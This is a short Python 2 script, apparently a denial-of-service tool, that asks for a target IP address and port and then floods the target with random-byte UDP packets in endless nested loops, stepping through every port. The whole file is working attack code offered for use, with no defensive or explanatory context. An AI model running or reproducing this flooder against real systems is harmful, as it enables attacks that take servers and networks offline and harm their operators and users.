import sys
import os
import socket
import random

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


bytes = random._urandom(50)
bytes1 = random._urandom(25)

try:
   os.system("clear")
   os.system("python src/logo.py")
   ip = raw_input("While IP Target : ")
   port = input("While the Port : ")
   os.system("python3 src/Starter.py")
except SyntaxError:
      print(R + '[-] ' + C + 'Error code: 422 Unprocessable Entity')

sent = 0
speedsent = 0
try:
   while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
        if port == 65534:
          port = 1
        while True:
             sock.sendto(bytes, (ip,port))
             sent = sent + 1
             port = port + 1
             print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
             if port == 65534:
               port = 1
             while True:
                  sock.sendto(bytes1, (ip,port))
                  sent = sent + 1
                  port = port + 1
                  print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
                  if port == 65534:
                    port = 1
                  while True:
                       sock.sendto(bytes1, (ip,port))
                       sent = sent + 1
                       port = port + 1
                       print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
                       if port == 65534:
                         port = 1

except KeyboardInterrupt:
      print('\n' + R + '[!]' + C + ' Keyboard Interrupt! Terminaling...' + W)
except socket.gaierror:
      print(R + '[-] ' + C + 'No address associated with hostname! Unknown Adress')
      print(R + '[-] ' + C + 'please write the working IP address!')
